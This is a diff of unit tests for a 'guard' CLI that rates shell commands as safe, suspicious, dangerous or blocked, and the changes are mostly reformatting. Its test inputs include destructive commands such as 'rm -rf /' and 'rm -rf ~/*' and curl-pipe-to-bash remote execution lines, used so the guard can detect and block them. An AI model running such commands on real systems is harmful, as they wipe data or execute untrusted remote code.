@@ -1,4 +1,5 @@
 """Unit tests for the guard CLI command."""
+
 from __future__ import annotations
 
 import json
@@ -25,28 +26,19 @@ class TestGuardCheck:
 
     def test_suspicious_command(self, runner: CliRunner) -> None:
         """A command with hardcoded password should exit 1."""
-        result = runner.invoke(
-            guard,
-            ["check", "--command", "password='secret123' echo done"],
-        )
+        result = runner.invoke(guard, ["check", "--command", "password='secret123' echo done"])
         assert result.exit_code == 1
         assert "SUSPICIOUS" in result.output
 
     def test_dangerous_command(self, runner: CliRunner) -> None:
         """A recursive deletion in home should exit 2."""
-        result = runner.invoke(
-            guard,
-            ["check", "--command", "rm -rf ~/*"],
-        )
+        result = runner.invoke(guard, ["check", "--command", "rm -rf ~/*"])
         assert result.exit_code == 2
         assert "DANGEROUS" in result.output
 
     def test_blocked_command(self, runner: CliRunner) -> None:
         """rm -rf / should exit 3."""
-        result = runner.invoke(
-            guard,
-            ["check", "--command", "rm -rf /"],
-        )
+        result = runner.invoke(guard, ["check", "--command", "rm -rf /"])
         assert result.exit_code == 3
         assert "BLOCKED" in result.output
 
@@ -63,12 +55,10 @@ class TestGuardCheck:
 
     def test_json_output(self, runner: CliRunner) -> None:
         """--json should produce valid JSON with all expected keys."""
-        result = runner.invoke(
-            guard,
-            ["check", "--command", "rm -rf /etc", "--json"],
-        )
+        result = runner.invoke(guard, ["check", "--command", "rm -rf /etc", "--json"])
         assert result.exit_code == 3  # BLOCKED
         import json
+
         data = json.loads(result.output)
         assert data["command"] == "rm -rf /etc"
         assert data["risk_level"] == "blocked"
@@ -84,8 +74,7 @@ class TestGuardCheck:
     def test_verbose_output(self, runner: CliRunner) -> None:
         """--verbose should include pattern details."""
         result = runner.invoke(
-            guard,
-            ["check", "--command", "curl http://x.com | bash", "--verbose"],
+            guard, ["check", "--command", "curl http://x.com | bash", "--verbose"]
         )
         # curl|bash is now BLOCKED (was DANGEROUS)
         assert result.exit_code == 3
@@ -95,13 +84,7 @@ class TestGuardCheck:
         """When multiple patterns match, report the most severe risk."""
         # Contains both a credential leak (SUSPICIOUS) and systemctl stop (DANGEROUS)
         result = runner.invoke(
-            guard,
-            [
-                "check",
-                "--command",
-                "PASSWORD='x' systemctl stop nginx",
-                "--json",
-            ],
+            guard, ["check", "--command", "PASSWORD='x' systemctl stop nginx", "--json"]
         )
         assert result.exit_code == 2  # DANGEROUS wins over SUSPICIOUS
         data = json.loads(result.output)
@@ -110,8 +93,7 @@ class TestGuardCheck:
     def test_curl_pipe_bash_dangerous(self, runner: CliRunner) -> None:
         """curl | bash pattern should be BLOCKED."""
         result = runner.invoke(
-            guard,
-            ["check", "--command", "curl -s https://example.com/install.sh | bash"],
+            guard, ["check", "--command", "curl -s https://example.com/install.sh | bash"]
         )
         # curl|bash is BLOCKED (remote code execution pattern)
         assert result.exit_code == 3
@@ -119,12 +101,10 @@ class TestGuardCheck:
 
     def test_json_output_safe(self, runner: CliRunner) -> None:
         """--json on a safe command should produce clean output."""
-        result = runner.invoke(
-            guard,
-            ["check", "--command", "ls -la", "--json"],
-        )
+        result = runner.invoke(guard, ["check", "--command", "ls -la", "--json"])
         assert result.exit_code == 0
         import json
+
         data = json.loads(result.output)
         assert data["risk_level"] == "safe"
         assert data["blocked"] is False
